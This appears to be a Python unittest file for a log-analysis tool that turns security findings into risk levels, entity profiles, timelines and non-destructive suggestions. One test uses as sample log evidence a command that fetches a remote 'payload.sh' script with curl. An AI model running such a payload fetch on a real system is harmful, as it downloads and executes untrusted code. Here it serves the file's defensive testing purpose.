import unittest
from datetime import datetime

from logcheck.insights import generate_insights
from logcheck.models import AnalysisResult, Event, Finding


class InsightTests(unittest.TestCase):
    def test_generates_summary_and_entity_profile(self):
        result = AnalysisResult(
            events=[Event("auth.log", 1, "Failed password", source_address="192.0.2.10")],
            findings=[
                Finding(
                    rule_id="keyword.failed_login",
                    severity="medium",
                    explanation="Failed login",
                    evidence=["Failed password"],
                    source_file="auth.log",
                    line_number=1,
                    source_address="192.0.2.10",
                )
            ],
        )

        insights = generate_insights(result)

        self.assertEqual(insights.risk_level, "medium")
        self.assertIn("192.0.2.10", [profile.value for profile in insights.entity_profiles])
        self.assertTrue(insights.suggestions)

    def test_highest_severity_wins_risk_level(self):
        result = AnalysisResult(
            findings=[
                Finding("keyword.low", "low", "Low finding"),
                Finding("keyword.medium", "medium", "Medium finding"),
                Finding("keyword.high", "high", "High finding"),
                Finding("keyword.critical", "critical", "Critical finding"),
            ]
        )

        insights = generate_insights(result)

        self.assertEqual(insights.risk_level, "critical")

    def test_no_findings_produces_low_risk_summary(self):
        insights = generate_insights(AnalysisResult(events=[Event("app.log", 1, "ok")], findings=[]))

        self.assertEqual(insights.risk_level, "low")
        self.assertIn("no configured rule", insights.headline.lower())

    def test_entity_grouping_prefers_source_address_over_actor_and_source_file(self):
        result = AnalysisResult(
            findings=[
                Finding(
                    rule_id="keyword.source_address",
                    severity="medium",
                    explanation="Addressed event",
                    source_address="192.0.2.10",
                    actor="alice",
                    source_file="auth.log",
                )
            ]
        )

        insights = generate_insights(result)

        self.assertEqual(insights.entity_profiles[0].kind, "source_address")
        self.assertEqual(insights.entity_profiles[0].value, "192.0.2.10")

    def test_entity_grouping_prefers_actor_over_source_file(self):
        result = AnalysisResult(
            findings=[
                Finding(
                    rule_id="keyword.actor",
                    severity="medium",
                    explanation="Actor event",
                    actor="alice",
                    source_file="auth.log",
                )
            ]
        )

        insights = generate_insights(result)

        self.assertEqual(insights.entity_profiles[0].kind, "actor")
        self.assertEqual(insights.entity_profiles[0].value, "alice")

    def test_entity_grouping_uses_source_file_when_source_and_actor_are_absent(self):
        result = AnalysisResult(
            findings=[
                Finding(
                    rule_id="keyword.source_file",
                    severity="medium",
                    explanation="File event",
                    source_file="auth.log",
                )
            ]
        )

        insights = generate_insights(result)

        self.assertEqual(insights.entity_profiles[0].kind, "source_file")
        self.assertEqual(insights.entity_profiles[0].value, "auth.log")

    def test_unknown_entity_grouping_preserves_findings_without_source_or_actor(self):
        result = AnalysisResult(
            findings=[
                Finding(
                    rule_id="keyword.suspicious",
                    severity="high",
                    explanation="Suspicious local event",
                    evidence=["unexpected command"],
                    source_file=None,
                    line_number=None,
                )
            ]
        )

        insights = generate_insights(result)

        unknown_profiles = [profile for profile in insights.entity_profiles if profile.kind == "unknown"]
        self.assertEqual(len(unknown_profiles), 1)
        self.assertEqual(unknown_profiles[0].value, "unknown")
        self.assertEqual(unknown_profiles[0].finding_count, 1)

    def test_timeline_falls_back_to_file_line_when_timestamp_is_missing(self):
        result = AnalysisResult(
            findings=[
                Finding(
                    rule_id="keyword.failed_login",
                    severity="medium",
                    explanation="Failed login",
                    evidence=["Failed password"],
                    source_file="auth.log",
                    line_number=12,
                )
            ]
        )

        insights = generate_insights(result)

        self.assertEqual(insights.timeline[0].label, "auth.log:12")
        self.assertEqual(insights.timeline[0].source, "auth.log:12")

    def test_timeline_label_uses_timestamp_isoformat_when_timestamp_is_present(self):
        timestamp = datetime(2026, 6, 5, 10, 30, 45)
        result = AnalysisResult(
            findings=[
                Finding(
                    rule_id="keyword.failed_login",
                    severity="medium",
                    explanation="Failed login",
                    evidence=["Failed password"],
                    source_file="auth.log",
                    line_number=12,
                    timestamp=timestamp,
                )
            ]
        )

        insights = generate_insights(result)

        self.assertEqual(insights.timeline[0].label, timestamp.isoformat())
        self.assertEqual(insights.timeline[0].source, "auth.log:12")

    def test_suggestions_are_non_destructive(self):
        result = AnalysisResult(
            findings=[
                Finding(
                    rule_id="behavior.suspicious_command",
                    severity="high",
                    explanation="Suspicious command",
                    evidence=["curl http://198.51.100.7/payload.sh"],
                    source_file="app.log",
                    line_number=3,
                    actor="alice",
                )
            ]
        )

        insights = generate_insights(result)
        text = " ".join(f"{suggestion.title} {suggestion.detail}" for suggestion in insights.suggestions).lower()

        for forbidden in ["scan", "block", "exploit", "upload", "remote"]:
            self.assertNotIn(forbidden, text)


if __name__ == "__main__":
    unittest.main()
